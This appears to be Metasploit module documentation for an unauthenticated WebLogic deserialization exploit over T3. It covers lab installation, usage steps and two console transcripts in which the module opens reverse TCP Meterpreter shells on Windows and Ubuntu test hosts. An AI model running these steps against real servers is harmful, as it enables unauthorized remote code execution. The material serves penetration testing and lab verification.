## Vulnerable Application

  There exists a Java object deserialization vulnerability
  in multiple versions of WebLogic.

  Unauthenticated remote code execution can be achieved
  by sending a serialized `BadAttributeValueExpException` object
  over the T3 protocol to vulnerable WebLogic servers.

  This module has been tested against versions `v12.1.3.0.0`,
  `v12.2.1.3.0`, and `v12.2.1.4.0`.

  WebLogic versions can be downloaded from [here](https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.html).

### Installation

  Some version of Java 8 JDK is required to be installed on the server.
  This module has been tested successfully using jdk8u202 and [jdk8u251](https://www.oracle.com/java/technologies/javase-jdk8-downloads.html).

  Installation instructions for WebLogic can be found [here](https://docs.oracle.com/cd/E24705_01/doc.91/e21052/appx_install_wls.htm#EOPWC376).

  On step 10 of the installation instructions, keep the
  `Run Quickstart` box checked and click `done`. A new window
  should pop up. Select `Create a new domain` -> `next`.
  Ensure `Basic WebLogic Server Domain` is selected and click `next`.
  Create credentials and select `next`. Domain mode can be either
  `Production` or `Development`, then click `next`. Click `next` again
  and select `Create`. Click `next` a couple more times, then click
  `finish`.

  To start WebLogic, execute the `startWebLogic` script in
  `Oracle/Middleware/Oracle_Home/user_projects/domains/base_domain/`.

## Verification Steps

- [ ] Install the application
- [ ] Start msfconsole
- [ ] Do: ```use exploit/multi/misc/weblogic_deserialize_badattrval```
- [ ] Do: ```set RHOSTS <ip>```
- [ ] Do: ```run```
- [ ] You should get a meterpreter session.

## Scenarios
### WebLogic `v12.2.1.4` on Windows 10

  ```
  msf5 > use exploit/multi/misc/weblogic_deserialize_badattrval
  msf5 exploit(multi/misc/weblogic_deserialize_badattrval) > set rhosts 172.16.215.185
  rhosts => 172.16.215.185
  msf5 exploit(multi/misc/weblogic_deserialize_badattrval) > set lhost 172.16.215.1
  lhost => 172.16.215.1
  msf5 exploit(multi/misc/weblogic_deserialize_badattrval) > run

  [*] Started reverse TCP handler on 172.16.215.1:4444
  [*] 172.16.215.185:7001 - WebLogic version detected: 12.2.1.4.0
  [*] 172.16.215.185:7001 - Sending handshake...
  [*] 172.16.215.185:7001 - Formatting payload...
  [*] 172.16.215.185:7001 - Sending object...
  [*] Sending stage (176195 bytes) to 172.16.215.185
  [*] Meterpreter session 1 opened (172.16.215.1:4444 -> 172.16.215.185:50795) at 2020-05-15 09:37:45 -0500

  meterpreter > getuid
  Server username: DESKTOP-AQT4EG1\space
  meterpreter > sysinfo
  Computer        : DESKTOP-AQT4EG1
  OS              : Windows 10 (10.0 Build 18362).
  Architecture    : x64
  System Language : en_US
  Domain          : WORKGROUP
  Logged On Users : 4
  Meterpreter     : x86/windows
  ```

### WebLogic `v12.1.3.0.0` on Ubuntu 18.04 Linux

  ```
  msf5 exploit(multi/misc/weblogic_deserialize_badattrval) > set target 1
  target => 1
  msf5 exploit(multi/misc/weblogic_deserialize_badattrval) > set payload linux/x64/meterpreter/reverse_tcp
  payload => linux/x64/meterpreter/reverse_tcp
  msf5 exploit(multi/misc/weblogic_deserialize_badattrval) > set rhosts 172.16.215.196
  rhosts => 172.16.215.196
  msf5 exploit(multi/misc/weblogic_deserialize_badattrval) > run

  [*] Started reverse TCP handler on 172.16.215.1:4444 
  [*] 172.16.215.196:7001 - WebLogic version detected: 12.1.3.0.0
  [*] 172.16.215.196:7001 - Sending handshake...
  [*] 172.16.215.196:7001 - Formatting payload...
  [*] 172.16.215.196:7001 - Sending object...
  [*] Sending stage (3012516 bytes) to 172.16.215.196
  [*] Meterpreter session 6 opened (172.16.215.1:4444 -> 172.16.215.196:60672) at 2020-05-15 09:41:17 -0500
  [*] 172.16.215.196:7001 - Command Stager progress - 101.36% done (820/809 bytes)

  meterpreter > getuid
  Server username: no-user @ ubuntu (uid=1000, gid=1000, euid=1000, egid=1000)
  meterpreter > sysinfo
  Computer     : 172.16.215.196
  OS           : Ubuntu 18.04 (Linux 4.18.0-15-generic)
  Architecture : x64
  BuildTuple   : x86_64-linux-musl
  Meterpreter  : x64/linux
  ```
